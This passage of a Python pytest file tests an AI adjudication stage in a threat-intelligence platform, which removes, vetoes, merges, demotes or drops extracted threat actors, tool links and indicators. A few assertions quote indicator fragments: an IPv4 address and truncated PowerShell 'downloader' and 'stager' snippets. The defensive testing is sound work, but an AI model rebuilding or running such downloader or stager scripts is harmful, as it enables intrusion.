    by_id = {it.item_id: it for it in items}
    assert 'found in: table row under "Indicators of Compromise"' in by_id["ioc:ipv4:45.77.12.9"].line
    assert 'script (powershell) "downloader": "Invoke-WebRequest' in by_id[f"ioc:script:{script.value}"].line
    assert 'script (powershell) "stager": "$c = New-Object' in by_id[f"ioc:script:{staged_sha}"].line


@pytest.mark.asyncio
async def test_manifest_ai_ttp_shows_its_attack_table_row(db_session: AsyncSession, feed):
    entry = await _make_entry(db_session, feed)
    entry.content_text = IOC_ARTICLE
    ttp = TTP(technique_id="T1059.001", technique_name="PowerShell", tactic="execution")
    db_session.add(ttp)
    await db_session.flush()
    db_session.add(EntryTTP(entry_id=entry.id, ttp_id=ttp.id, confidence="high", source_text="T1059.001-run.ps1"))
    await db_session.flush()
    items, _ = await build_manifest(db_session, entry, _payload())
    t = next(it for it in items if it.entity_type == "ttp")
    assert t.forms == ["T1059.001", "PowerShell"]
    assert 'listed in: table row under "MITRE ATT&CK"' in t.line


def test_validate_reclassify_needs_valid_type():
    item = _item("link:threat_actor:a")
    ok, _ = _validate_verdicts(
        {
            "verdicts": [
                {
                    "item_id": item.item_id,
                    "verdict": "reclassify",
                    "suggested_type": "malware",
                    "reason": f"{item.name} is malware",
                }
            ]
        },
        [item],
    )
    bad, _ = _validate_verdicts(
        {"verdicts": [{"item_id": item.item_id, "verdict": "reclassify", "suggested_type": "planet"}]}, [item]
    )
    assert ok[0].verdict == "reclassify" and ok[0].suggested_type == "malware"
    assert bad[0].verdict == "keep"


# ------------------------------------------------------------------ shadow writes


@pytest.mark.asyncio
async def test_shadow_writes_proposals_and_mutates_nothing(db_session: AsyncSession, feed):
    await _seed_settings(db_session)
    entry = await _make_entry(db_session, feed)
    storm = await _link_actor(db_session, entry, "Storm")
    victim = await _link_actor(db_session, entry, "Water Utility Co", source="ai", minted=True, article_count=1)
    group = await _link_actor(db_session, entry, "Warlock Group", source="ai", minted=True, article_count=1)
    cobalt = Tool(name="Cobalt Strike", article_count=40)
    db_session.add(cobalt)
    await db_session.flush()
    db_session.add(
        EntryTool(
            entry_id=entry.id,
            tool_id=cobalt.id,
            confidence="low",
            source="ai",
            matched_names=["Cobalt Strike"],
            extracted_at=datetime.now(UTC),
        )
    )
    edge = EntityRelationship(
        source_type="threat_actor",
        source_id=group.id,
        target_type="tool",
        target_id=cobalt.id,
        relationship_type="uses",
        confidence="probable",
        source="auto_extracted",
        description="watch for Cobalt Strike beacons",
        evidence_entry_ids=[entry.id],
    )
    db_session.add(edge)
    entry.observable_candidates = [{"kind": "domain", "value": "cdn.vendor-research.net", "origin": "ai"}]
    await db_session.flush()

    items, _ = await build_manifest(db_session, entry, _payload())
    # Give the merge item a candidate by hand (the alias index is not populated in tests).
    for it in items:
        if it.entity_id == group.id:
            it.candidates = [
                {
                    "entity_type": "threat_actor",
                    "entity_id": str(storm.id),
                    "name": "Storm",
                    "aliases": [],
                    "article_count": 3,
                }
            ]
    result = {
        "verdicts": [
            {
                "item_id": f"link:threat_actor:{storm.id}",
                "verdict": "remove",
                "confidence": "high",
                "reason": "Storm here is the weather",
            },
            {"item_id": f"link:threat_actor:{victim.id}", "verdict": "veto", "confidence": "high", "reason": "victim"},
            {
                "item_id": f"link:threat_actor:{group.id}",
                "verdict": "merge",
                "confidence": "high",
                "merge_into": "Storm",
            },
            {
                "item_id": f"link:tool:{cobalt.id}",
                "verdict": "remove",
                "confidence": "medium",
                "reason": "Cobalt Strike only in generic advice",
            },
            {
                "item_id": f"edge:{edge.id}",
                "verdict": "demote",
                "confidence": "medium",
                "reason": "Cobalt Strike only in generic advice",
            },
            {
                "item_id": "ioc:domain:cdn.vendor-research.net",
                "verdict": "drop",
                "confidence": "high",
                "reason": "own blog",
            },
        ]
    }
    verdicts, _ = _validate_verdicts(result, items)
    cfg = await adj._settings(db_session)
    detail = await apply_verdicts(db_session, entry, verdicts, _payload(), cfg)
    await db_session.flush()

    assert detail["mode"] == "shadow" and detail["applied"] == 0
    assert detail["verdicts"] == {"remove": 2, "veto": 1, "merge": 1, "demote": 1, "drop": 1}
    assert detail["breaker"] is True  # 6 of 6 items destructive

    # Nothing changed: junctions, edge, candidates all intact.
    assert (
        await db_session.execute(select(EntryThreatActor).where(EntryThreatActor.entry_id == entry.id))
    ).scalars().all().__len__() == 3
    assert (await db_session.get(EntityRelationship, edge.id)).confidence == "probable"
    assert (await db_session.get(Entry, entry.id)).observable_candidates[0]["value"] == "cdn.vendor-research.net"
    assert await db_session.get(ThreatActor, victim.id) is not None

    # Proposals landed in the two logs the queues read.
    link_rows = (
        (await db_session.execute(select(EntityLinkValidationLog).where(EntityLinkValidationLog.entry_id == entry.id)))
        .scalars()
        .all()
    )
    assert [r.action for r in link_rows] == ["shadow_remove"] and link_rows[0].entity_id == storm.id
    maint = {
        (r.action, r.entity_type): r for r in (await db_session.execute(select(EntityMaintenanceLog))).scalars().all()
    }
    assert (ACTION_VETO, "threat_actor") in maint and maint[(ACTION_VETO, "threat_actor")].before["entity"][
        "name"
    ] == "Water Utility Co"
    assert maint[(ACTION_MERGE, "threat_actor")].after["merge_into"] == "Storm"
    assert maint[(ACTION_UNLINK, "tool")].entity_id == cobalt.id
    assert maint[(ACTION_EDGE_DEMOTE, "relationship")].entity_id == edge.id
    assert maint[(ACTION_IOC_DROP, "observable")].after["value"] == "cdn.vendor-research.net"
    assert all(r.mode == "shadow" and r.applied is False for r in maint.values())


@pytest.mark.asyncio
async def test_positive_evidence_override_keeps_extracted_names(db_session: AsyncSession, feed):
    await _seed_settings(db_session)
    entry = await _make_entry(db_session, feed)
    warlock = await _link_actor(db_session, entry, "Warlock")
    items, _ = await build_manifest(db_session, entry, _payload())
    verdicts, _ = _validate_verdicts(
        {
            "verdicts": [
                {
                    "item_id": f"link:threat_actor:{warlock.id}",
                    "verdict": "remove",
                    "confidence": "high",
                    "reason": "Warlock is a game title",
                }
            ]
        },
        items,
    )
    cfg = await adj._settings(db_session)
    detail = await apply_verdicts(db_session, entry, verdicts, _payload(threat_actors=[{"name": "Warlock"}]), cfg)
    assert detail["keep_overridden"] == 1 and detail["verdicts"] == {"keep": 1}
    assert not (await db_session.execute(select(EntityLinkValidationLog))).scalars().all()


# ------------------------------------------------------------------ worker task end to end


@pytest.mark.asyncio
async def test_task_reviews_entry_with_stubbed_model(db_session: AsyncSession, feed, monkeypatch):
    """_adjudicate_entry: warms settings, builds the manifest, calls the task,
    files shadow proposals, stamps the request row, returns the run detail."""
    from contextlib import asynccontextmanager

    from app.models.user import User
    from app.workers import adjudication_tasks as tasks

    await _seed_settings(db_session)
    system = User(username="system", password_hash="x", role="system")
    db_session.add(system)
    await db_session.flush()
    entry = await _make_entry(db_session, feed)
    await _request(db_session, entry)
    storm = await _link_actor(db_session, entry, "Storm")
    # The current analysis result the task reads the payload from.
    from app.models.ai_result import AIResult
    from app.models.ai_task import AITask

    task_row = AITask(
        name="entry_analysis", display_name="t", description="", category="extraction", default_prompt_template="x"
    )
    db_session.add(task_row)
    await db_session.flush()
    db_session.add(
        AIResult(
            entry_id=entry.id,
            target_type="entry",
            target_id=entry.id,
            is_current=True,
            task_id=task_row.id,
            prompt_used="",
            raw_response="",
            parsed_result=_payload(),
        )
    )
    await db_session.flush()

    @asynccontextmanager
    async def fake_session():
        yield db_session

    captured = {}

    async def fake_run_task(db, user_id, task_name, variables, **kwargs):
        captured["task_name"] = task_name
        captured["variables"] = variables
        return {
            "_extraction_status": "success",
            "verdicts": [
                {
                    "item_id": f"link:threat_actor:{storm.id}",
                    "verdict": "remove",
                    "confidence": "high",
                    "reason": "Storm here is the weather",
                }
            ],
            "assessment": {"verdict": "ok", "reason": ""},
        }

    class _Lock:
        def set(self, *a, **k):
            return True

        def delete(self, *a, **k):
            return 1

    async def fake_system_user(db):
        return system.id

    async def noop_commit():
        await db_session.flush()

    monkeypatch.setattr(tasks, "worker_session", fake_session)
    monkeypatch.setattr(tasks.redis, "from_url", lambda *a, **k: _Lock())
    monkeypatch.setattr("app.ai.engine.run_task", fake_run_task)
    monkeypatch.setattr("app.services.system_user.get_system_user_id", fake_system_user)
    monkeypatch.setattr(db_session, "commit", noop_commit)

    detail = await tasks._adjudicate_entry(entry.id)

    assert captured["task_name"] == "entry_adjudication"
    assert captured["variables"]["item_count"] == 1
    assert f"link:threat_actor:{storm.id}" in captured["variables"]["manifest_block"]
    assert detail["mode"] == "shadow" and detail["verdicts"] == {"remove": 1}
    row = (
        await db_session.execute(select(AIAnalysisRequest).where(AIAnalysisRequest.entry_id == entry.id))
    ).scalar_one()
    assert row.adjudication_status == adj.COMPLETED and row.adjudicated_at is not None
    log = (await db_session.execute(select(EntityLinkValidationLog))).scalar_one()
    assert log.action == "shadow_remove" and log.entity_id == storm.id


@pytest.mark.asyncio
async def test_task_records_off_without_calling_model(db_session: AsyncSession, feed, monkeypatch):
    from contextlib import asynccontextmanager

    from app.workers import adjudication_tasks as tasks

    await _seed_settings(db_session, adjudication_mode="off")
    entry = await _make_entry(db_session, feed)
    await _request(db_session, entry)

    @asynccontextmanager
    async def fake_session():
        yield db_session

    class _Lock:
        def set(self, *a, **k):
            return True

        def delete(self, *a, **k):
            return 1

    async def boom(*a, **k):
        raise AssertionError("model must not be called when mode is off")

    async def noop_commit():
        await db_session.flush()

    monkeypatch.setattr(tasks, "worker_session", fake_session)
    monkeypatch.setattr(tasks.redis, "from_url", lambda *a, **k: _Lock())
    monkeypatch.setattr("app.ai.engine.run_task", boom)
    monkeypatch.setattr(db_session, "commit", noop_commit)

    detail = await tasks._adjudicate_entry(entry.id)
    assert detail == {"skipped": "off", "mode": "off"}
    row = (
        await db_session.execute(select(AIAnalysisRequest).where(AIAnalysisRequest.entry_id == entry.id))
    ).scalar_one()
    assert row.adjudication_status == adj.SKIPPED_OFF


# ------------------------------------------------------------------ hygiene feed + drawer endpoint (commit 3)


async def _adjudication_result(db_session, entry):
    """An AIResult for the adjudication task, so link rows can carry its id."""
    from app.models.ai_result import AIResult
    from app.models.ai_task import AITask

    task = AITask(
        name=adj.TASK_NAME, display_name="r", description="", category="extraction", default_prompt_template="x"
    )
    db_session.add(task)
    await db_session.flush()
    result = AIResult(
        entry_id=entry.id,
        target_type=adj.TARGET_TYPE,
        target_id=entry.id,
        is_current=True,
        task_id=task.id,
        prompt_used="",
        raw_response="",
        parsed_result={},
    )
    db_session.add(result)
    await db_session.flush()
    return result


@pytest.mark.asyncio
async def test_feed_tags_origin_and_filters_adjudicator_rows(client, admin_headers, db_session: AsyncSession, feed):
    await _seed_settings(db_session)
    entry = await _make_entry(db_session, feed)
    storm = await _link_actor(db_session, entry, "Storm")
    victim = await _link_actor(db_session, entry, "Water Utility Co", source="ai", minted=True, article_count=1)
    result = await _adjudication_result(db_session, entry)

    # One adjudicator link verdict (carries the adjudication result id), one
    # legacy validator row (no result), one adjudicator veto row.
    db_session.add(
        EntityLinkValidationLog(
            entry_id=entry.id,
            entity_type="threat_actor",
            entity_id=storm.id,
            entity_name_snapshot="Storm",
            action="shadow_remove",
            reason="weather",
            ai_result_id=result.id,
        )
    )
    db_session.add(
        EntityLinkValidationLog(
            entry_id=entry.id,
            entity_type="threat_actor",
            entity_id=storm.id,
            entity_name_snapshot="Storm",
            action="shadow_remove",
            reason="nightly",
        )
    )
    db_session.add(
        EntityMaintenanceLog(
            entity_type="threat_actor",
            entity_id=victim.id,
            action=ACTION_VETO,
            mode="shadow",
            before={
                "entry_id": str(entry.id),
                "entity": {"name": "Water Utility Co", "aliases": [], "article_count": 1},
            },
            after={"reason": "victim organisation", "confidence": "high"},
            reasoning="victim organisation",
            applied=False,
        )
    )
    await db_session.commit()

    resp = await client.get(
        "/api/admin/hygiene/feed", params={"pending": "true", "origin": "adjudicator"}, headers=admin_headers
    )
    assert resp.status_code == 200, resp.text
    rows = resp.json()["rows"]
    assert {r["origin"] for r in rows} == {"adjudicator"}
    actions = sorted(r["action"] for r in rows)
    # the validator's leftover row counts as the adjudicator's too
    assert actions == [ACTION_VETO, "shadow_remove", "shadow_remove"]
    veto = next(r for r in rows if r["action"] == ACTION_VETO)
    assert veto["confidence"] == "high" and veto["entity_name"] == "Water Utility Co"
    assert veto["subject"].startswith("Veto: Water Utility Co")
    assert veto["actions"] == ["apply", "dismiss"]
    assert {link["kind"] for link in veto["links"]} == {"entity", "entry"}

    resp = await client.get(
        "/api/admin/hygiene/feed", params={"pending": "true", "origin": "scan"}, headers=admin_headers
    )
    assert resp.json()["rows"] == []

    stats = (await client.get("/api/admin/hygiene/stats", headers=admin_headers)).json()
    assert stats["adjudication_mode"] == "shadow" and stats["adjudication_pending"] == 3

    # The drawer endpoint keys the same rows by manifest item id.
    resp = await client.get(f"/api/engine/entries/{entry.id}/adjudication", headers=admin_headers)
    assert resp.status_code == 200, resp.text
    body = resp.json()
    by_id = {v["item_id"]: v for v in body["verdicts"]}
    assert by_id[f"link:threat_actor:{storm.id}"]["verdict"] == "remove"
    assert by_id[f"link:threat_actor:{victim.id}"]["verdict"] == "veto"
    assert all(v["applied"] is False for v in body["verdicts"])


# ------------------------------------------------------------------ apply mode (commit 4)


async def _verdicts_for(db_session, entry, raw):
    items, _ = await build_manifest(db_session, entry, _payload())
    verdicts, _ = _validate_verdicts({"verdicts": raw}, items)
    return items, verdicts


@pytest.mark.asyncio
async def test_apply_removes_links_at_high_confidence_and_files_the_rest(db_session: AsyncSession, feed):
    await _seed_settings(db_session, adjudication_mode="apply")
    entry = await _make_entry(db_session, feed)
    storm = await _link_actor(db_session, entry, "Storm")
    warlock = await _link_actor(db_session, entry, "Warlock", article_count=14)
    keep_me = await _link_actor(db_session, entry, "Nightspire", article_count=5)
    _items, verdicts = await _verdicts_for(
        db_session,
        entry,
        [
            {
                "item_id": f"link:threat_actor:{storm.id}",
                "verdict": "remove",
                "confidence": "high",
                "reason": "Storm here is the weather",
            },
            {
                "item_id": f"link:threat_actor:{warlock.id}",
                "verdict": "remove",
                "confidence": "medium",
                "reason": "Warlock, hmm",
            },
        ],
    )
    cfg = await adj._settings(db_session)
    cfg["breaker_pct"] = 1.0  # 2 of 3 destructive would trip the default breaker; that case has its own test
    detail = await apply_verdicts(db_session, entry, verdicts, _payload(), cfg)
    await db_session.flush()

    assert detail["mode"] == "apply" and detail["applied"] == 1 and detail["shadowed"] == 1
    linked = {
        r.threat_actor_id
        for r in (await db_session.execute(select(EntryThreatActor).where(EntryThreatActor.entry_id == entry.id)))
        .scalars()
        .all()
    }
    assert linked == {warlock.id, keep_me.id}  # Storm gone, medium-confidence Warlock kept
    await db_session.refresh(storm)
    assert storm.article_count == 2
    logs = {
        (r.entity_id, r.action) for r in (await db_session.execute(select(EntityLinkValidationLog))).scalars().all()
    }
    assert logs == {(storm.id, "removed"), (warlock.id, "shadow_remove")}


@pytest.mark.asyncio
async def test_apply_veto_deletes_only_when_nothing_else_holds_the_entity(db_session: AsyncSession, feed):
    await _seed_settings(db_session, adjudication_mode="apply")
    entry = await _make_entry(db_session, feed)
    victim = await _link_actor(db_session, entry, "Water Utility Co", source="ai", minted=True, article_count=1)
    shared = await _link_actor(db_session, entry, "Warlock Group", source="ai", minted=True, article_count=2)
    other = await _make_entry(db_session, feed)
    db_session.add(
        EntryThreatActor(
            entry_id=other.id,
            threat_actor_id=shared.id,
            confidence="high",
            source="auto_link",
            matched_names=["Warlock Group"],
            extracted_at=datetime.now(UTC),
        )
    )
    await db_session.flush()
    _items, verdicts = await _verdicts_for(
        db_session,
        entry,
        [
            {"item_id": f"link:threat_actor:{victim.id}", "verdict": "veto", "confidence": "high", "reason": "victim"},
            {"item_id": f"link:threat_actor:{shared.id}", "verdict": "veto", "confidence": "high", "reason": "dupe"},
        ],
    )
    cfg = await adj._settings(db_session)
    cfg["breaker_pct"] = 1.0  # two of two are destructive; don't trip the breaker here
    detail = await apply_verdicts(db_session, entry, verdicts, _payload(), cfg)
    await db_session.flush()

    assert detail["applied"] == 2
    assert await db_session.get(ThreatActor, victim.id) is None  # one article, nothing else: deleted
    assert await db_session.get(ThreatActor, shared.id) is not None  # another article links it: kept
    await db_session.refresh(shared)
    assert shared.article_count == 1
    rows = {r.action: r for r in (await db_session.execute(select(EntityMaintenanceLog))).scalars().all()}
    assert rows[ACTION_VETO].entity_id == victim.id and rows[ACTION_VETO].after["deleted"] is True
    assert rows[ACTION_VETO].before["entity"]["name"] == "Water Utility Co"
    assert rows[ACTION_UNLINK].entity_id == shared.id and rows[ACTION_UNLINK].after["deleted"] is False
    assert all(r.applied and r.mode == "apply" for r in rows.values())


@pytest.mark.asyncio
async def test_apply_demotes_edge_like_the_nightly_job_and_drops_iocs(db_session: AsyncSession, feed):
    from app.models.observable import EntryObservable, Observable

    await _seed_settings(db_session, adjudication_mode="apply")
    entry = await _make_entry(db_session, feed)
    warlock = await _link_actor(db_session, entry, "Warlock", source="ai", article_count=14)
    cobalt = Tool(name="Cobalt Strike", article_count=40)
    db_session.add(cobalt)
    await db_session.flush()
    edge = EntityRelationship(
        source_type="threat_actor",
        source_id=warlock.id,
        target_type="tool",
        target_id=cobalt.id,
        relationship_type="uses",
        confidence="probable",
        source="auto_extracted",
        description="watch for Cobalt Strike beacons",
        evidence_entry_ids=[entry.id],
    )
    rejected = EntityRelationship(
        source_type="threat_actor",
        source_id=warlock.id,
        target_type="tool",
        target_id=cobalt.id,
        relationship_type="targets",
        confidence="possible",
        source="analyst_rejected",
        evidence_entry_ids=[entry.id],
    )
    db_session.add_all([edge, rejected])
    obs = Observable(kind="sha256", value="9f3a" * 16, sighting_count=1, article_count=1)
    db_session.add(obs)
    await db_session.flush()
    db_session.add(EntryObservable(entry_id=entry.id, observable_id=obs.id, source="ai", confidence="high"))
    entry.observable_candidates = [{"kind": "domain", "value": "cdn.vendor-research.net", "origin": "ai"}]
    await db_session.flush()

    items, verdicts = await _verdicts_for(
        db_session,
        entry,
        [
            {
                "item_id": f"edge:{edge.id}",
                "verdict": "demote",
                "confidence": "high",
                "reason": "Cobalt Strike only in generic advice",
            },
            {
                "item_id": "ioc:domain:cdn.vendor-research.net",
                "verdict": "drop",
                "confidence": "high",
                "reason": "own blog",
            },
            {"item_id": f"ioc:sha256:{'9f3a' * 16}", "verdict": "drop", "confidence": "high", "reason": "sample"},
        ],
    )
    assert not any(it.item_id == f"edge:{rejected.id}" for it in items)  # analyst-rejected edges never listed
    cfg = await adj._settings(db_session)
    cfg["breaker_pct"] = 1.0
    detail = await apply_verdicts(db_session, entry, verdicts, _payload(), cfg)
    await db_session.flush()

    assert detail["applied"] == 3
    edge = await db_session.get(EntityRelationship, edge.id)
    assert edge.confidence == "possible" and edge.adjudication_verdict == "coincidental" and edge.adjudicated_at
    assert (await db_session.get(Entry, entry.id)).observable_candidates == []
    assert (
        await db_session.execute(select(EntryObservable).where(EntryObservable.entry_id == entry.id))
    ).scalar_one_or_none() is None
    assert (await db_session.get(Observable, obs.id)).sighting_count == 0


_BREAKER_NAMES = ["Storm", "Nightspire", "Driftwood", "Ashgrove", "Kestrel"]


async def _remove_all(db_session: AsyncSession, entry, names: list[str]):
    actors = [await _link_actor(db_session, entry, n) for n in names]
    _items, verdicts = await _verdicts_for(
        db_session,
        entry,
        [
            {"item_id": f"link:threat_actor:{a.id}", "verdict": "remove", "confidence": "high", "reason": f"{n} r"}
            for a, n in zip(actors, names, strict=True)
        ],
    )
    return verdicts


async def _linked_actors(db_session: AsyncSession, entry) -> int:
    return len(
        (await db_session.execute(select(EntryThreatActor).where(EntryThreatActor.entry_id == entry.id)))
        .scalars()
        .all()
    )


@pytest.mark.asyncio
async def test_apply_breaker_downgrades_whole_run_to_proposals(db_session: AsyncSession, feed):
    await _seed_settings(db_session, adjudication_mode="apply")
    entry = await _make_entry(db_session, feed)
    verdicts = await _remove_all(db_session, entry, _BREAKER_NAMES)
    cfg = await adj._settings(db_session)  # breaker 0.5, min 5 items; 5/5 destructive trips it
    detail = await apply_verdicts(db_session, entry, verdicts, _payload(), cfg)
    assert detail["breaker"] and detail["mode"] == "shadow" and detail["applied"] == 0
    assert await _linked_actors(db_session, entry) == 5


@pytest.mark.asyncio
async def test_apply_breaker_ignores_runs_below_min_items(db_session: AsyncSession, feed):
    """A two-item recheck that removes both is 100% destructive, but two
    verdicts are not a pattern: each applies on its own confidence."""
    await _seed_settings(db_session, adjudication_mode="apply")
    entry = await _make_entry(db_session, feed)
    verdicts = await _remove_all(db_session, entry, _BREAKER_NAMES[:2])
    cfg = await adj._settings(db_session)
    detail = await apply_verdicts(db_session, entry, verdicts, _payload(), cfg)
    assert not detail["breaker"] and detail["mode"] == "apply" and detail["applied"] == 2
    assert await _linked_actors(db_session, entry) == 0


async def _pending_link_proposals(db_session: AsyncSession, entry) -> int:
    return (
        await db_session.execute(
            select(func.count())
            .select_from(EntityLinkValidationLog)
            .where(EntityLinkValidationLog.entry_id == entry.id, EntityLinkValidationLog.action == "shadow_remove")
        )
    ).scalar_one()


async def _held_first_look(db_session: AsyncSession, feed):
    """An apply-mode review whose five removes trip the breaker: five pending
    proposals the article's second look has to settle."""
    await _seed_settings(db_session, adjudication_mode="apply")
    entry = await _make_entry(db_session, feed)
    await _adjudication_result(db_session, entry)
    verdicts = await _remove_all(db_session, entry, _BREAKER_NAMES)
    cfg = await adj._settings(db_session)
    detail = await apply_verdicts(db_session, entry, verdicts, _payload(), cfg)
    await db_session.flush()
    assert detail["breaker"] and detail["applied"] == 0 and "second_look" not in detail
    assert await _pending_link_proposals(db_session, entry) == 5
    return entry, cfg


@pytest.mark.asyncio
async def test_second_look_applies_what_it_repeats_and_closes_the_rest(db_session: AsyncSession, feed):
    entry, cfg = await _held_first_look(db_session, feed)
    request = await _request(db_session, entry)
    assert await adj.owe_second_look(db_session, request, entry)
    assert request.adjudication_status == adj.RECHECK and request.adjudication_recheck_since is None

    actors = {a.name: a for a in (await db_session.execute(select(ThreatActor))).scalars()}
    _items, verdicts = await _verdicts_for(
        db_session,
        entry,
        [
            {
                "item_id": f"link:threat_actor:{actors[n].id}",
                "verdict": "remove",
                "confidence": "high",
                "reason": f"{n} x",
            }
            for n in _BREAKER_NAMES[:2]
        ],
    )
    detail = await apply_verdicts(db_session, entry, verdicts, _payload(), cfg)
    await db_session.flush()

    assert detail["second_look"] and detail["mode"] == "apply"
    assert detail["confirmed"] == 2 and detail["closed"] == 3 and detail["applied"] == 2
    assert detail["shadowed"] == 0
    assert await _linked_actors(db_session, entry) == 3
    assert await _pending_link_proposals(db_session, entry) == 0
    assert await adj.earlier_proposals(db_session, entry.id) == {}
    assert not await adj.owe_second_look(db_session, request, entry)


@pytest.mark.asyncio
async def test_second_look_files_nothing_new(db_session: AsyncSession, feed):
    entry, cfg = await _held_first_look(db_session, feed)
    late = await _link_actor(db_session, entry, "Latecomer")
    _items, verdicts = await _verdicts_for(
        db_session,
        entry,
        [
            {
                "item_id": f"link:threat_actor:{late.id}",
                "verdict": "remove",
                "confidence": "medium",
                "reason": "Latecomer x",
            }
        ],
    )
    detail = await apply_verdicts(db_session, entry, verdicts, _payload(), cfg)
    await db_session.flush()

    # Under the floor and never filed; the five earlier verdicts it did not repeat close.
    assert detail["second_look"] and detail["unfiled"] == 1 and detail["closed"] == 5
    assert await _linked_actors(db_session, entry) == 6
    assert await _pending_link_proposals(db_session, entry) == 0


@pytest.mark.asyncio
async def test_a_recheck_is_never_a_second_look(db_session: AsyncSession, feed):
    """A recheck judges only the held matches settled since: it must not close
    earlier verdicts about links it was never shown."""
    entry, cfg = await _held_first_look(db_session, feed)
    detail = await apply_verdicts(db_session, entry, [], _payload(), cfg, recheck=True)
    assert "second_look" not in detail
    assert await _pending_link_proposals(db_session, entry) == 5


@pytest.mark.asyncio
async def test_backlog_owes_a_second_look_to_articles_with_pending_verdicts(db_session: AsyncSession, feed):
    entry, _cfg = await _held_first_look(db_session, feed)
    request = await _request(db_session, entry)
    request.adjudication_status = adj.COMPLETED
    clean = await _make_entry(db_session, feed)
    other = await _request(db_session, clean)
    other.adjudication_status = adj.COMPLETED
    await db_session.flush()

    assert await adj.queue_second_look_backlog(db_session) == 1
    assert request.adjudication_status == adj.RECHECK and request.adjudication_recheck_since is None
    assert other.adjudication_status == adj.COMPLETED


@pytest.mark.asyncio
async def test_shadow_runs_never_sample_the_rolling_breaker(db_session: AsyncSession, feed, monkeypatch):
    """The rolling breaker pauses dispatch for an hour. A shadow run changes
    nothing, so sampling one would throttle the soak that is meant to collect
    verdicts at full rate."""
    _use_fake_redis(monkeypatch)
    await _seed_settings(db_session, adjudication_mode="shadow")
    cfg = await adj._settings(db_session)

    # Twelve all-destructive shadow runs — well past the 10 samples the rolling
    # breaker needs — and dispatch is still open.
    for i in range(12):
        entry = await _make_entry(db_session, feed)
        actor = await _link_actor(db_session, entry, f"Storm {i}")
        _items, verdicts = await _verdicts_for(
            db_session,
            entry,
            [
                {
                    "item_id": f"link:threat_actor:{actor.id}",
                    "verdict": "remove",
                    "confidence": "high",
                    "reason": f"{actor.name} is weather",
                }
            ],
        )
        detail = await apply_verdicts(db_session, entry, verdicts, _payload(), cfg)
        assert detail["mode"] == "shadow" and detail["rolling_breaker"] is False

    assert await adj.breaker_paused_until() is None
    assert await adj._consume_hour_budget(100) is None


@pytest.mark.asyncio
async def test_queue_apply_then_restore_recreates_a_vetoed_entity(
    client, admin_headers, db_session: AsyncSession, feed
):
    await _seed_settings(db_session)
    entry = await _make_entry(db_session, feed)
    victim = await _link_actor(
        db_session, entry, "Water Utility Co", source="ai", minted=True, article_count=1, aliases=["WUC"]
    )
    _items, verdicts = await _verdicts_for(
        db_session,
        entry,
        [{"item_id": f"link:threat_actor:{victim.id}", "verdict": "veto", "confidence": "high", "reason": "victim"}],
    )
    cfg = await adj._settings(db_session)
    await apply_verdicts(db_session, entry, verdicts, _payload(), cfg)  # shadow proposal
    await db_session.commit()
    row = (
        await db_session.execute(select(EntityMaintenanceLog).where(EntityMaintenanceLog.action == ACTION_VETO))
    ).scalar_one()

    resp = await client.post(f"/api/admin/hygiene/adjudication/{row.id}/apply", headers=admin_headers)
    assert resp.status_code == 200, resp.text
    assert resp.json()["applied"] is True and resp.json()["detail"]["deleted"] is True
    gone = (
        await db_session.execute(
            select(ThreatActor).where(ThreatActor.id == victim.id).execution_options(populate_existing=True)
        )
    ).scalar_one_or_none()
    assert gone is None

    resp = await client.post(f"/api/admin/hygiene/adjudication/{row.id}/restore", headers=admin_headers)
    assert resp.status_code == 200, resp.text
    assert resp.json()["restored"] is True
    back = (
        await db_session.execute(
            select(ThreatActor).where(ThreatActor.id == victim.id).execution_options(populate_existing=True)
        )
    ).scalar_one_or_none()
    assert back is not None and back.name == "Water Utility Co" and back.aliases == ["WUC"]
    assert (
        await db_session.execute(select(EntryThreatActor).where(EntryThreatActor.entry_id == entry.id))
    ).scalar_one().threat_actor_id == victim.id

    feed_rows = (
        await client.get("/api/admin/hygiene/feed", params={"origin": "adjudicator"}, headers=admin_headers)
    ).json()["rows"]
    assert any(r["action"] == ACTION_VETO and r["payload"]["after"].get("restored") for r in feed_rows)


# ------------------------------------------------------------------ takeover (commit 5)


def test_extraction_prompt_no_longer_judges_links():
    """The one-pass call only extracts; link judgment lives in the adjudicate stage."""
    from app.ai.prompts.defaults import SYSTEM_TASKS

    task = next(t for t in SYSTEM_TASKS if t["name"] == "entry_analysis")
    assert "link_validations" not in task["output_schema"]["properties"]
    assert "link_validations" not in task["output_schema"]["required"]
    assert "linked_entities" not in task["variables"]
    assert "CANDIDATE ENTITY TAGS" not in task["default_prompt_template"]
    assert "link_validations" not in task["default_system_template"]


def test_the_reviewer_is_asked_for_changes_only():
    """One line per item does not fit in the task's 4096 output tokens at the
    manifest caps (60 links + 10 edges + 25 observables), and a truncated
    response is a parse error that discards the whole review. So the prompt
    asks for the changes alone, and an omitted item_id has to mean keep."""
    from app.ai.prompts.defaults import DEFAULT_ASSIGNMENT_CONFIGS, SYSTEM_TASKS

    task = next(t for t in SYSTEM_TASKS if t["name"] == "entry_adjudication")
    assert "RETURN ONLY THE ITEMS YOU WOULD CHANGE" in task["default_system_template"]
    assert "ONLY for the ones you would change" in task["default_prompt_template"]
    assert DEFAULT_ASSIGNMENT_CONFIGS["entry_adjudication"]["max_tokens"] == 4096

    items = [_item("link:threat_actor:a"), _item("edge:1", kind="edge"), _item("ioc:domain:x", kind="ioc")]
    # The clean review: no verdicts at all.
    verdicts, stats = _validate_verdicts({"verdicts": []}, items)
    assert [v.verdict for v in verdicts] == ["keep", "keep", "keep"]
    assert not stats["duplicate"] and not any(v for k, v in stats.items() if k != "duplicate")
    # And the usual case: one changed item, the rest kept by omission.
    verdicts, _stats = _validate_verdicts(
        {"verdicts": [{"item_id": "ioc:domain:x", "verdict": "drop", "confidence": "high"}]}, items
    )
    by = {v.item.item_id: v.verdict for v in verdicts}
    assert by == {"link:threat_actor:a": "keep", "edge:1": "keep", "ioc:domain:x": "drop"}


@pytest.mark.asyncio
async def test_keep_counter_promotes_edge_after_three_distinct_entries(db_session: AsyncSession, feed):
    await _seed_settings(db_session, adjudication_mode="apply")
    warlock = ThreatActor(name="Warlock", article_count=14)
    cobalt = Tool(name="Cobalt Strike", article_count=40)
    db_session.add_all([warlock, cobalt])
    await db_session.flush()
    edge = EntityRelationship(
        source_type="threat_actor",
        source_id=warlock.id,
        target_type="tool",
        target_id=cobalt.id,
        relationship_type="uses",
        confidence="probable",
        source="auto_extracted",
        description="Warlock deploys Cobalt Strike",
        evidence_entry_ids=[],
    )
    db_session.add(edge)
    await db_session.flush()

    async def keep_from(entry):
        edge.evidence_entry_ids = [*(edge.evidence_entry_ids or []), entry.id]
        db_session.add(edge)
        await db_session.flush()
        items, _ = await build_manifest(db_session, entry, _payload())
        verdicts, _ = _validate_verdicts(
